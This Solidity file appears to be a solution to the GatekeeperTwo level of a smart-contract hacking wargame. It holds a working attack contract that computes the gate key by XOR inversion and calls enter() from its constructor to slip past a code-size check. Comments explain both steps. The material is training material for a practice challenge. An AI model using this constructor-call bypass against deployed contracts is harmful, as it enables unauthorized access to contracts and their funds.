// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "hardhat/console.sol";

import './GatekeeperTwo.sol';
contract GatekeeperTwoAttack {
    constructor(address addr) public {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0)-1);
        addr.call(abi.encodeWithSignature('enter(bytes8)',_key));
    }
}

//Make all on contructor because of the second gate, we need to have a contract empty and when we call in contructor the contract isn't initiate yet.abi
//To calculate the correct value of bytes only need to invert the operators ( the contract have A ^ B = C  so we use A ^ C = B) and than use B.